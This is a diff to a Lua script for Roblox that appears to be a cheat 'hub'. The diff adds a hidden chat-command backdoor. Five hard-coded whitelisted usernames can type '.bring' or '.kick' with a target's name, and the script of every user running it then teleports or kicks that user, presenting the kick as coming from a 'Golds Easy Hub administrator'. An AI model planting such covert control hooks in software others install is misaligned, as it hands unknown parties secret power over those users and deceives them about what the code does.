@@ -6205,6 +6205,77 @@ Converted["_FlySpeedButton"].FocusLost:Connect(function()
 	end
 end)
 
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local localPlayer = Players.LocalPlayer
+
+local commands = {
+    [".bring"] = function(sender)
+        if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
+            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                localPlayer.Character:SetPrimaryPartCFrame(sender.Character.PrimaryPart.CFrame)
+            end
+        end
+    end,
+    [".kick"] = function(sender)
+        localPlayer:Kick("You have been kicked from the server by a Golds Easy Hub administrator.")
+    end
+}
+
+local adminWhitelist = {
+    "ikDebris",
+    "lvasion",
+    "starsorbitspace",
+    "restaxts",
+    "ixpinkyyxi"
+}
+
+function getPlayer(short)
+    short = string.lower(short)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name:lower():sub(1, #short) == short or player.DisplayName:lower():sub(1, #short) == short then
+            return player
+        end
+    end
+    return nil
+end
+
+function chatted(sender, msg)
+    local plrFound = false
+    
+    for _, v in pairs(adminWhitelist) do
+        if v == sender.Name then
+            plrFound = true
+            break
+        end
+    end
+    
+    if not plrFound then
+        return
+    end
+    
+    local args = msg:split(" ")
+    local command = args[1]
+    local targetName = args[2]
+    
+    if commands[command] and targetName then
+        local targetPlayer = getPlayer(targetName)
+        if targetPlayer and targetPlayer == localPlayer then
+            print("fired command")
+            commands[command](sender)
+        end
+    end
+end
+
+TextChatService.OnIncomingMessage = function(message)
+    if message.TextSource then
+        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+        if sender then
+            chatted(sender, message.Text)
+        end
+    end
+end
+
 coroutine.wrap(SXNOFKY_fake_script)()
 coroutine.wrap(JKNTAV_fake_script)()
 coroutine.wrap(CDCYXT_fake_script)()
